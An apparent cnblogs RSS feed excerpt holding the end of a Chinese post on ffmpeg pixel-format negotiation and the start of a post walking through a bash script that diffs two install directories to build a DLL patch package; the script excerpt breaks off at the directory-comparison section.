&lt;p&gt;ffmpeg 自动插入滤镜，协调滤镜格式。buffer 滤镜输出的格式是 ffmpeg hevc 解码器解码输出的图像像素格式，是 yuv422p10le。buffersink 滤镜的输入格式，是 ffmpeg 在 buffersink 滤镜前插入 format 滤镜，在执行 format 滤镜初始化时，从 hevc_nvenc 编码器支持的像素格式列表中，选定了 yuv444p16le，作为编码器的输入格式。由 scale 滤镜执行像素格式转换操作：yuv422p10le 转为 yuv444p16le。&lt;/p&gt;
&lt;p&gt;通过滤镜指定格式 yuv420p10le：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ffmpeg -hide_banner -y -re -i ./hevc_4k_422_10b_5994_60m_vibe.ts -vf format=yuv420p10le 
-c:v hevc_nvenc -preset fast -profile:v main10 -c:a aac -f mpegts /dev/null
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;滤镜图如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;         yuv422p10le     yuv420p10le      yuv420p10le     p010le           p010le
[buffer] ------&amp;gt; [scale] ------&amp;gt; [format] ------&amp;gt; [scale] ------&amp;gt; [format] ------&amp;gt; [buffersink]
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;第三个滤镜 format 是我们在命令行中给出的滤镜。第五个滤镜 format 是编码器输入格式滤镜，是 ffmpeg 在滤镜图与编码器间进行像素格式协商时，在 hevc_nvenc 编码器支持的像素格式列表中，选择了 p010le 像素格式作为编码器的输入格式，并在此 format 滤镜前自动插入一个 scale 滤镜执行像素格式转换。&lt;/p&gt;
&lt;p&gt;可以看到，一个像素格式转换，在命令行中是由一个 scale 滤镜紧跟一个 format 滤镜实现的，scale + format 滤镜可由用户在命令中显式给出，ffmpeg 也会根据实际情况按需插入。&lt;/p&gt;
&lt;p&gt;通过滤镜指定格式 p010le：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ffmpeg -hide_banner -y -re -i ./hevc_4k_422_10b_5994_60m_vibe.ts -vf format=p010le 
-c:v hevc_nvenc -preset fast -profile:v main10 -c:a aac -f mpegts /dev/null
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;滤镜图如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;         yuv422p10le     p010le           p010le           p010le
[buffer] ------&amp;gt; [scale] ------&amp;gt; [format] ------&amp;gt; [format] ------&amp;gt; [buffersink]
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;第三个滤镜 format 是我们在命令行中给出的滤镜。第四个滤镜 format 是编码器输入格式滤镜，是 ffmpeg 在滤镜图与编码器间进行像素格式协商时，在 hevc_nvenc 编码器支持的像素格式列表中，选择了 p010le 像素格式作为编码器的输入格式。第二个滤镜 scale 执行实际的像素格式转换操作：yuv422p10le 转 p010le。&lt;/p&gt;
</description>
<pubDate>Tue, 02 Feb 2021 00:34:00 +0000</pubDate>
<dc:creator>叶余</dc:creator>
<og:description>本文为作者原创，转载请注明出处：https://www.cnblogs.com/leisure_chn/p/14355015.html libswscale 源码分析系列文章： [1]. FFmpeg</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/leisure_chn/p/14355015.html</dc:identifier>
</item>
<item>
<title>使用 shell 脚本自动对比两个安装目录并生成差异补丁包 - goodcitizen</title>
<link>http://www.cnblogs.com/goodcitizen/p/compare_two_dir_and_generate_patch_package_by_shell_scripts.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/goodcitizen/p/compare_two_dir_and_generate_patch_package_by_shell_scripts.html</guid>
<description>&lt;p&gt;shell 除了处理一下文本，还有什么想象空间呢？今天拿一个补丁包开刀……&lt;/p&gt;&lt;div id=&quot;cnblogs_post_body&quot; readability=&quot;194.90166294777&quot;&gt;

&lt;p&gt;公司各个业务线的安装包小则几十兆、大则几百兆，使用自建的升级系统向全国百万级用户下发新版本时，流量耗费相当惊人。有时新版本仅仅改了几个 dll ，总变更量不过几十 K 而已，也要发布一个完整版本。为了降低流量费用，我们推出了补丁升级的方式：产品组将修改的 dll 单独挑选出来，加上一个配置文件压缩成包，上传到自建的升级后台；在客户端，识别到补丁包类型后，手动解压并替换各个 dll 完成安装（之前是直接启动下载好的安装包）。这种方式一经推出，受到了业务线的追捧。然而在使用过程中，也发现一些问题，就是在修改完一个源文件后，受影响的往往不止一个 dll，如果仅把其中一两个 dll 替换了，没替换的 dll 很可能就会和新的 dll 产生接口不兼容，从而引发崩溃。而有的安装包包含了几十个、上百个 dll，如果一一对比，非常费时费力。特别是一些 dll 仅仅是编译时间不一样，通过普通的文件对比工具，根本无法判断这个 dll  的源码有没有改过，这让开发人员非常头大。&lt;/p&gt;

&lt;p&gt;其实这个问题用 c++ 写个程序是可以解决的，但是一想到要遍历目录、构造文件名 map、对比两个目录中的文件名、对比相同文件名的内容、复制文件到目标目录、压缩目标目录…这一系列操作时，我觉得还是算了 —— 都得从头开始写，工作量不小。而 msys2 或 windows 中就有不少现成的命令可以用，例如对比目录可以用 diff -r 命令、对比 win32 可执行文件可以用 dumpbin /disasm 命令反编译然后再用 diff 命令对比、压缩文件夹可以使用 7z 命令等等，完全不用重复造轮子，直接用 shell 将它们粘合起来就完事了！下面就来看看我是怎么用 shell 脚本来写这个小工具吧。&lt;/p&gt;
&lt;h2&gt;处理命令行参数&lt;/h2&gt;
&lt;p&gt;这个脚本一开始先处理输入的命令行参数：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt;  1&lt;/span&gt; &lt;span&gt;# return code:
&lt;/span&gt;&lt;span&gt;  2&lt;/span&gt; # &lt;span&gt;0&lt;/span&gt;&lt;span&gt; : success
&lt;/span&gt;&lt;span&gt;  3&lt;/span&gt; # &lt;span&gt;1&lt;/span&gt;&lt;span&gt; : no difference
&lt;/span&gt;&lt;span&gt;  4&lt;/span&gt; # &lt;span&gt;2&lt;/span&gt;&lt;span&gt; : compress failure
&lt;/span&gt;&lt;span&gt;  5&lt;/span&gt; # &lt;span&gt;3&lt;/span&gt; : create &lt;span&gt;file&lt;/span&gt;/&lt;span&gt;dir&lt;/span&gt; failure (privilege ?&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;  6&lt;/span&gt; # &lt;span&gt;126&lt;/span&gt; : &lt;span&gt;file&lt;/span&gt;/&lt;span&gt;dir&lt;/span&gt;&lt;span&gt; existent
&lt;/span&gt;&lt;span&gt;  7&lt;/span&gt; # &lt;span&gt;127&lt;/span&gt;&lt;span&gt; : invalid arguments
&lt;/span&gt;&lt;span&gt;  8&lt;/span&gt; 
&lt;span&gt;  9&lt;/span&gt; &lt;span&gt;function&lt;/span&gt;&lt;span&gt; usage ()
&lt;/span&gt;&lt;span&gt; 10&lt;/span&gt; &lt;span&gt;{
&lt;/span&gt;&lt;span&gt; 11&lt;/span&gt;     &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Usage: diffpacker.sh -o oldversionfolder -n newversionfolder -r relativepath -x exportfolder -v version [-s sp] [-t (verbose)] [-e (exactmode)]&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 12&lt;/span&gt;     
&lt;span&gt; 13&lt;/span&gt;     exit &lt;span&gt;127&lt;/span&gt;
&lt;span&gt; 14&lt;/span&gt; &lt;span&gt;}
&lt;/span&gt;&lt;span&gt; 15&lt;/span&gt; 
&lt;span&gt; 16&lt;/span&gt; srcdir=
&lt;span&gt; 17&lt;/span&gt; dstdir=
&lt;span&gt; 18&lt;/span&gt; reldir=
&lt;span&gt; 19&lt;/span&gt; outdir=
&lt;span&gt; 20&lt;/span&gt; version=
&lt;span&gt; 21&lt;/span&gt; sp=&lt;span&gt;0&lt;/span&gt;
&lt;span&gt; 22&lt;/span&gt; verbose=&lt;span&gt;0&lt;/span&gt;
&lt;span&gt; 23&lt;/span&gt; exactmode=&lt;span&gt;0&lt;/span&gt;
&lt;span&gt; 24&lt;/span&gt; setupdir=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;setup&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 25&lt;/span&gt; &lt;span&gt;# pure windows utilities subdir
&lt;/span&gt;&lt;span&gt; 26&lt;/span&gt; win32=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;win32&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; 
&lt;span&gt; 27&lt;/span&gt; 
&lt;span&gt; 28&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; [ &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${$*/-t//}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; != &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$*&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt;
&lt;span&gt; 29&lt;/span&gt; &lt;span&gt;    # dump parameters when verbose on
&lt;/span&gt;&lt;span&gt; 30&lt;/span&gt;     &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;total $# param(s):&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 31&lt;/span&gt;     &lt;span&gt;for&lt;/span&gt; var &lt;span&gt;in&lt;/span&gt; $*; &lt;span&gt;do&lt;/span&gt;
&lt;span&gt; 32&lt;/span&gt;         &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$var&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 33&lt;/span&gt;     &lt;span&gt;done&lt;/span&gt;
&lt;span&gt; 34&lt;/span&gt; &lt;span&gt;fi&lt;/span&gt;
&lt;span&gt; 35&lt;/span&gt; 
&lt;span&gt; 36&lt;/span&gt; 
&lt;span&gt; 37&lt;/span&gt; &lt;span&gt;while&lt;/span&gt; getopts &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;o:n:r:x:v:s:te&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; arg 
&lt;/span&gt;&lt;span&gt; 38&lt;/span&gt; &lt;span&gt;do&lt;/span&gt;
&lt;span&gt; 39&lt;/span&gt;     &lt;span&gt;case&lt;/span&gt; $arg &lt;span&gt;in&lt;/span&gt;
&lt;span&gt; 40&lt;/span&gt; &lt;span&gt;        o)
&lt;/span&gt;&lt;span&gt; 41&lt;/span&gt;             srcdir=&lt;span&gt;$OPTARG
&lt;/span&gt;&lt;span&gt; 42&lt;/span&gt; &lt;span&gt;            ;;
&lt;/span&gt;&lt;span&gt; 43&lt;/span&gt; &lt;span&gt;        n)
&lt;/span&gt;&lt;span&gt; 44&lt;/span&gt;             dstdir=&lt;span&gt;$OPTARG
&lt;/span&gt;&lt;span&gt; 45&lt;/span&gt; &lt;span&gt;            ;;
&lt;/span&gt;&lt;span&gt; 46&lt;/span&gt; &lt;span&gt;        r)
&lt;/span&gt;&lt;span&gt; 47&lt;/span&gt;             reldir=&lt;span&gt;$OPTARG
&lt;/span&gt;&lt;span&gt; 48&lt;/span&gt; &lt;span&gt;            ;;
&lt;/span&gt;&lt;span&gt; 49&lt;/span&gt; &lt;span&gt;        x)
&lt;/span&gt;&lt;span&gt; 50&lt;/span&gt;             outdir=&lt;span&gt;$OPTARG
&lt;/span&gt;&lt;span&gt; 51&lt;/span&gt; &lt;span&gt;            ;;
&lt;/span&gt;&lt;span&gt; 52&lt;/span&gt; &lt;span&gt;        v)
&lt;/span&gt;&lt;span&gt; 53&lt;/span&gt;             version=&lt;span&gt;$OPTARG
&lt;/span&gt;&lt;span&gt; 54&lt;/span&gt; &lt;span&gt;            ;;
&lt;/span&gt;&lt;span&gt; 55&lt;/span&gt; &lt;span&gt;        s)
&lt;/span&gt;&lt;span&gt; 56&lt;/span&gt;             sp=&lt;span&gt;$OPTARG
&lt;/span&gt;&lt;span&gt; 57&lt;/span&gt; &lt;span&gt;            ;;
&lt;/span&gt;&lt;span&gt; 58&lt;/span&gt; &lt;span&gt;        t)
&lt;/span&gt;&lt;span&gt; 59&lt;/span&gt;             verbose=&lt;span&gt;1&lt;/span&gt;
&lt;span&gt; 60&lt;/span&gt; &lt;span&gt;            ;;
&lt;/span&gt;&lt;span&gt; 61&lt;/span&gt; &lt;span&gt;        e) 
&lt;/span&gt;&lt;span&gt; 62&lt;/span&gt;             exactmode=&lt;span&gt;1&lt;/span&gt;
&lt;span&gt; 63&lt;/span&gt; &lt;span&gt;            ;;
&lt;/span&gt;&lt;span&gt; 64&lt;/span&gt;         ?&lt;span&gt;)  
&lt;/span&gt;&lt;span&gt; 65&lt;/span&gt;             &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;unkonw argument: $arg&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 66&lt;/span&gt; &lt;span&gt;            usage
&lt;/span&gt;&lt;span&gt; 67&lt;/span&gt;             exit &lt;span&gt;127&lt;/span&gt;
&lt;span&gt; 68&lt;/span&gt; &lt;span&gt;            ;;
&lt;/span&gt;&lt;span&gt; 69&lt;/span&gt;     &lt;span&gt;esac&lt;/span&gt;
&lt;span&gt; 70&lt;/span&gt; &lt;span&gt;done&lt;/span&gt;
&lt;span&gt; 71&lt;/span&gt; 
&lt;span&gt; 72&lt;/span&gt; &lt;span&gt;# reldir can be empty
&lt;/span&gt;&lt;span&gt; 73&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; [ -z &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$srcdir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; -o -z &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$dstdir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; -o -z &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$outdir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; -o -z &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$version&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt;
&lt;span&gt; 74&lt;/span&gt;     &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;empty parameter found: $srcdir, $dstdir, $outdir, $version&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 75&lt;/span&gt; &lt;span&gt;    usage
&lt;/span&gt;&lt;span&gt; 76&lt;/span&gt;     exit &lt;span&gt;127&lt;/span&gt;
&lt;span&gt; 77&lt;/span&gt; &lt;span&gt;fi&lt;/span&gt;
&lt;span&gt; 78&lt;/span&gt; 
&lt;span&gt; 79&lt;/span&gt; #replace all \ to / to avoid shell &lt;span&gt;string&lt;/span&gt;&lt;span&gt; choked on \ 
&lt;/span&gt;&lt;span&gt; 80&lt;/span&gt; srcdir=${srcdir&lt;span&gt;//&lt;/span&gt;&lt;span&gt;\\/\/}&lt;/span&gt;
&lt;span&gt; 81&lt;/span&gt; dstdir=${dstdir&lt;span&gt;//&lt;/span&gt;&lt;span&gt;\\/\/}&lt;/span&gt;
&lt;span&gt; 82&lt;/span&gt; reldir=${reldir&lt;span&gt;//&lt;/span&gt;&lt;span&gt;\\/\/}&lt;/span&gt;
&lt;span&gt; 83&lt;/span&gt; outdir=${outdir&lt;span&gt;//&lt;/span&gt;&lt;span&gt;\\/\/}&lt;/span&gt;
&lt;span&gt; 84&lt;/span&gt; 
&lt;span&gt; 85&lt;/span&gt; &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;srcdir=$srcdir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 86&lt;/span&gt; &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;dstdir=$dstdir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 87&lt;/span&gt; &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;reldir=$reldir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 88&lt;/span&gt; &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;outdir=$outdir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 89&lt;/span&gt; &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;version=$version&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 90&lt;/span&gt; &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;sp=$sp&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 91&lt;/span&gt; &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;verbose=$verbose&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 92&lt;/span&gt; &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;exactmode=$exactmode&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 93&lt;/span&gt; &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&quot;&lt;/span&gt;
&lt;span&gt; 94&lt;/span&gt; 
&lt;span&gt; 95&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; [ ! -d &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$srcdir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt; 96&lt;/span&gt;     &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;not a directory : $srcdir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 97&lt;/span&gt;     exit &lt;span&gt;126&lt;/span&gt;
&lt;span&gt; 98&lt;/span&gt; &lt;span&gt;fi&lt;/span&gt;
&lt;span&gt; 99&lt;/span&gt; 
&lt;span&gt;100&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; [ ! -d &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$dstdir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;101&lt;/span&gt;     &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;not a directory : $dstdir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;102&lt;/span&gt;     exit &lt;span&gt;126&lt;/span&gt;
&lt;span&gt;103&lt;/span&gt; &lt;span&gt;fi&lt;/span&gt;
&lt;span&gt;104&lt;/span&gt; 
&lt;span&gt;105&lt;/span&gt; &lt;span&gt;#if&lt;/span&gt; [ -e &quot;$outdir&quot; ]; then
&lt;span&gt;106&lt;/span&gt; resp=$(&lt;span&gt;ls&lt;/span&gt; -A &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$outdir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;107&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; [ &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$resp&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; != &lt;span&gt;&quot;&quot;&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt;
&lt;span&gt;108&lt;/span&gt;     &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;out directory not empty: $outdir, fatal error!&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;109&lt;/span&gt;     exit &lt;span&gt;126&lt;/span&gt;
&lt;span&gt;110&lt;/span&gt; &lt;span&gt;fi&lt;/span&gt; 
&lt;span&gt;111&lt;/span&gt; 
&lt;span&gt;112&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; [ &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${outdir:$((${#outdir}-1))}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; == &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;113&lt;/span&gt;     # remove tailing /
&lt;span&gt;114&lt;/span&gt;     outdir=${outdir%?&lt;span&gt;}
&lt;/span&gt;&lt;span&gt;115&lt;/span&gt; &lt;span&gt;fi&lt;/span&gt;
&lt;span&gt;116&lt;/span&gt; 
&lt;span&gt;117&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; [ ! -z &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$reldir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ] &amp;amp;&amp;amp; [ &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${reldir:$((${#reldir}-1))}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; == &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;118&lt;/span&gt;     # remove tailing /
&lt;span&gt;119&lt;/span&gt;     reldir=${reldir%?&lt;span&gt;}
&lt;/span&gt;&lt;span&gt;120&lt;/span&gt; &lt;span&gt;fi&lt;/span&gt;
&lt;span&gt;121&lt;/span&gt; 
&lt;span&gt;122&lt;/span&gt; srcasm=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;src.asm&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;123&lt;/span&gt; dstasm=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;dst.asm&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;124&lt;/span&gt; dirdiff=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;dir.diff&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;125&lt;/span&gt; patdiff=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;diffpattern.txt&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;126&lt;/span&gt; itemcnt=&lt;span&gt;0&lt;/span&gt;
&lt;span&gt;127&lt;/span&gt; jsonhead=&lt;span&gt;\
&lt;/span&gt;&lt;span&gt;128&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\
&lt;/span&gt;&lt;span&gt;129&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;  \&quot;version\&quot;: \&quot;$version\&quot;,\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\
&lt;/span&gt;&lt;span&gt;130&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;  \&quot;sp\&quot;: \&quot;$sp\&quot;,\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\
&lt;/span&gt;&lt;span&gt;131&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;  \&quot;actions\&quot;: \n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\
&lt;/span&gt;&lt;span&gt;132&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;  [\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;133&lt;/span&gt; 
&lt;span&gt;134&lt;/span&gt; json=
&lt;span&gt;135&lt;/span&gt; jsontail=&lt;span&gt;\
&lt;/span&gt;&lt;span&gt;136&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\n  ]\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\
&lt;/span&gt;&lt;span&gt;137&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;}\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;138&lt;/span&gt; 
&lt;span&gt;139&lt;/span&gt; &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;exclude patterns: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;140&lt;/span&gt; &lt;span&gt;while&lt;/span&gt;&lt;span&gt; read line
&lt;/span&gt;&lt;span&gt;141&lt;/span&gt; &lt;span&gt;do&lt;/span&gt;
&lt;span&gt;142&lt;/span&gt;     &lt;span&gt;echo&lt;/span&gt;&lt;span&gt; $line
&lt;/span&gt;&lt;span&gt;143&lt;/span&gt; &lt;span&gt;done&lt;/span&gt; &amp;lt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$patdiff&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;144&lt;/span&gt; 
&lt;span&gt;145&lt;/span&gt; # to avoid user not end &lt;span&gt;file&lt;/span&gt;&lt;span&gt; with \n
&lt;/span&gt;&lt;span&gt;146&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; [ ! -z &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$line&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;147&lt;/span&gt;     &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$line&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;148&lt;/span&gt; &lt;span&gt;fi&lt;/span&gt; 
&lt;span&gt;149&lt;/span&gt; &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;简单解说一下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;16-26：声明用到的变量；&lt;/li&gt;
&lt;li&gt;28-34：如果命令行中含有 -t (verbose) 选项，则打印命令行各个参数；&lt;/li&gt;
&lt;li&gt;37-70：使用 getopts 命令解析命令行，这个脚本接收以下选项：
&lt;ul&gt;&lt;li&gt;-o (old) 用于对比的旧目录；&lt;/li&gt;
&lt;li&gt;-n (new) 用于对比的新目录；&lt;/li&gt;
&lt;li&gt;-r (relative) 补丁包根目录相对于安装目录的位置，有时可能只针对安装目录的某个子目录进行 patch；&lt;/li&gt;
&lt;li&gt;-x (output) 输出补丁包的目录；&lt;/li&gt;
&lt;li&gt;-v (version) 补丁包版本号，写入配置文件用；&lt;/li&gt;
&lt;li&gt;-s (serial pack) 补丁号，写入配置文件用；&lt;/li&gt;
&lt;li&gt;-t (verbose) 详细输出；&lt;/li&gt;
&lt;li&gt;-e （exact mode) 配置文件中增加和替换文件项将按每项对应一段 json 的方式精确设置，否则按整个目录递归覆盖设置。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;72-77：空路径校验；&lt;/li&gt;
&lt;li&gt;79-83：替换路径中的反斜杠为斜杠，因 shell 会将反斜杠识别为转义字符的开始；&lt;/li&gt;
&lt;li&gt;85-93：打印识别后的各选项，方便出问题时排错；&lt;/li&gt;
&lt;li&gt;95-120：路径校验，包括：
&lt;ul&gt;&lt;li&gt;对比目录不得为普通文件；&lt;/li&gt;
&lt;li&gt;输出目录不得含有文件（防止将中间对比结果和上一次或其它对比结果放在一起打包）；&lt;/li&gt;
&lt;li&gt;剔除输出目录与相对目录的结尾斜杠（方便后续处理）。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;122-137：中间变量的定义，包含反编译中间文件、目录对比中间文件、忽略文件模式的中间文件以及生成配置文件的 json 头和尾；&lt;/li&gt;
&lt;li&gt;139-149：在对比目录时，用户可以提供一个要忽略的文件模式（pattern）列表，例如不对比 [Dd]ebug、[Ss]ymbol、*.pdb 这些编译中间目录或文件，可以使用正则表达式，每行一个。这里打印这些 pattern 用于排错。&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;对比目录&lt;/h2&gt;
&lt;p&gt;经过前期的铺垫，进入第一个重头戏：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; [ -f &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$patdiff&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt;
